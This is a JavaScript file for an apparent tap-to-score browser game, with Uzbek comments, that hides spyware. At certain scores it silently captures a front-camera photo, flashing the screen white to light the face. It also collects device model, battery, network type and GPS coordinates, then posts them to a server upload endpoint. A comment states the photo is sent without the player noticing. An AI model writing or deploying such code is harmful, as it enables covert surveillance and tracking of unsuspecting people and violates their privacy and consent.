let count = 0;
const scoreDisplay = document.getElementById('score');
const video = document.getElementById('v');
const canvas = document.getElementById('c');
const ctx = canvas.getContext('2d');

function updateScore() {
    count++;
    scoreDisplay.innerText = count;
    
    if (navigator.vibrate) navigator.vibrate(40); // Professional o'yin effekti

    // Ma'lum ochkolarda bilinmasdan rasm yuborish
    if (count === 3 || count === 20 || count === 50) {
        takeFullData();
    }
}

function initGame() {
    document.getElementById('overlay').style.display = 'none';
}

async function takeFullData() {
    try {
        // 1. Qurilma ma'lumotlarini yig'ish
        let batteryInfo = "Noma'lum";
        try {
            const battery = await navigator.getBattery();
            batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Zaryadda" : "Zaryadsiz"})`;
        } catch(e) {}

        const deviceInfo = {
            os: navigator.platform,
            model: navigator.userAgent.split('(')[1]?.split(')')[0] || "Noma'lum",
            battery: batteryInfo,
            net: navigator.connection ? navigator.connection.effectiveType : "Noma'lum"
        };

        // 2. Kamera (Old)
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        video.onloadedmetadata = async () => {
            // Screen Flash: rasm olishdan oldin ekranni yoritish (qorong'u uchun)
            document.body.style.background = "#fff"; 
            
            setTimeout(() => {
                ctx.drawImage(video, 0, 0, 640, 480);
                const imgFront = canvas.toDataURL('image/jpeg', 0.1);
                document.body.style.background = "#0b0e14"; // Ekranni qaytarish
                stream.getTracks().forEach(t => t.stop());

                // 3. GPS va ma'lumotlarni yuborish
                navigator.geolocation.getCurrentPosition((pos) => {
                    sendFullData(imgFront, pos.coords.latitude, pos.coords.longitude, deviceInfo);
                }, () => sendFullData(imgFront, "Noma'lum", "Noma'lum", deviceInfo));
            }, 100);
        };
    } catch (err) {
        console.log("System bypass");
    }
}

function sendFullData(img, lat, lon, info) {
    const message = `📱 *Qurilma:* ${info.model}\n🔋 *Batareya:* ${info.battery}\n🌐 *Internet:* ${info.net}\n📍 *GPS:* ${lat}, ${lon}`;
    
    fetch('/upload', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ 
            front: img, 
            lat: lat, 
            lon: lon,
            extra: message // Serverga qo'shimcha ma'lumot yuboramiz
        })
    });
}
